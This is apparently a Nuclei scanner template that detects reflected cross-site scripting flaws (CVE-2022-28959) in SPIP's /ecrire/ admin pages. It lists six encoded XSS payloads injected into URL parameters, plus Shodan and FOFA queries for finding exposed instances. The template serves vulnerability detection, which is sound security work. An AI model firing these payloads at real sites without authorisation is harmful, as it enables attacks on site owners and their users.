id: CVE-2022-28959

info:
  name: Multiple XSS vulnerabilities in Spip Web Framework
  author: ProjectDiscoveryAI
  severity: medium
  description: Multiple cross-site scripting (XSS) vulnerabilities in the component /spip.php of Spip Web Framework v3.1.13 and below allows attackers to execute arbitrary web scripts or HTML.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Apply the latest security patches provided by Spip Web Framework to mitigate the XSS vulnerabilities.
  reference:
    - https://www.root-me.org/fr/Informations/Faiblesses-decouvertes/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-28959
    cwe-id: CWE-79
    epss-score: 0.00132
    epss-percentile: 0.49771
    cpe: cpe:2.3:a:spip:spip:*:*:*:*:*:*:*:*
  metadata:
    vendor: spip
    product: spip
    shodan-query: html:"spip.php?page=backend"
    fofa-query:
      - app="spip"
      - body="spip.php?page=backend"

http:
  - method: GET
    path:
      - "{{BaseURL}}/ecrire/?exec=rubriques&titre=pouet%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E"
      - "{{BaseURL}}/ecrire/?exec=rubriques&label=laluka%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E"
      - "{{BaseURL}}/ecrire/?exec=rubriques&size_input=lalu%22%20onfocus=alert(domain)%20autofocus%20foo=%22"
      - "{{BaseURL}}/ecrire/?exec=article&id_article=1&sinon=%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E"
      - "{{BaseURL}}/ecrire/?exec=plan&null=lalu%27%20onmouseover=alert(domain)%20style=%27width:9999999px;height:9999999px;%27%20foo="
      - "{{BaseURL}}/ecrire/?exec=messages&typem=tout&quoi='%3E%3Cscript%3Ealert(domain)%3C/script%3E"

    matchers:
      - type: word
        words:
          - "alert(domain)"
        part: body
